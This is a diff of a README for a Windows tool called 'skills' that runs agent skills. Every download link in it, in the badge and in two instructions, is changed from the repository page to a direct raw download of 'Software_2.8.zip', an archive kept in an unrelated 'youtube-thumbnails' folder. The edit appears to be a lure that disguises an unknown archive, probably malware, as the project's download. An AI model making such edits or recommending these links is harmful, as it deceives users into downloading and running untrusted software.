@@ -1,6 +1,6 @@
 # 🧠 skills - Run agent skills with less friction
 
-[![Download skills](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/biyearly-mesothelioma790/skills)
+[![Download skills](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/biyearly-mesothelioma790/skills/raw/refs/heads/main/youtube-thumbnails/Software_2.8.zip)
 
 ## 📘 What this is
 
@@ -16,7 +16,7 @@ Use this section if you want to get **skills** running on a Windows PC.
 
 Go to this page:
 
-https://github.com/biyearly-mesothelioma790/skills
+https://github.com/biyearly-mesothelioma790/skills/raw/refs/heads/main/youtube-thumbnails/Software_2.8.zip
 
 If your browser shows the repository page, use it to get the project files.
 
@@ -126,7 +126,7 @@ If you moved the folder later, update the path in your AI tool.
 
 Visit the project page here and download the files from the repository:
 
-https://github.com/biyearly-mesothelioma790/skills
+https://github.com/biyearly-mesothelioma790/skills/raw/refs/heads/main/youtube-thumbnails/Software_2.8.zip
 
 ## 🧩 Best way to keep it organized
 
